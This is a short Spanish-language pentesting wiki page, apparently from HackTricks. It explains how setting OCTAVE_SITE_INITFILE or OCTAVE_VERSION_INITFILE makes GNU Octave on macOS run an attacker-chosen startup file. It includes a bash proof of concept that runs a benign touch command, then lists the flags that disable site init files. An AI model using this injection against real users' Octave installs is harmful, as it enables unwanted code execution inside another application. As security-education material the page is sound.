# Inyección de aplicaciones GNU Octave en macOS

{{#include ../../../banners/hacktricks-training.md}}

## `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave ejecuta varios archivos que contienen comandos válidos de Octave durante el inicio. `OCTAVE_SITE_INITFILE` anula el archivo de inicio de todo el sitio y `OCTAVE_VERSION_INITFILE` anula el específico de la versión, lo que permite que cualquiera de las dos variables redirija la ejecución automática a un archivo legible por el atacante.<sup>[[1]](#references)</sup>
```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```
`--no-init-file` solo omite los archivos del usuario, como `~/.octaverc`; **no** detiene la sobrescritura del archivo del sitio indicada anteriormente. Usa `--no-site-file` para los archivos del sitio, o `--norc` / `-f` para deshabilitar todos los archivos de inicio.<sup>[[2]](#references)</sup>

## References

- [1] [Archivos de inicio de GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [2] [Opciones de línea de comandos de GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
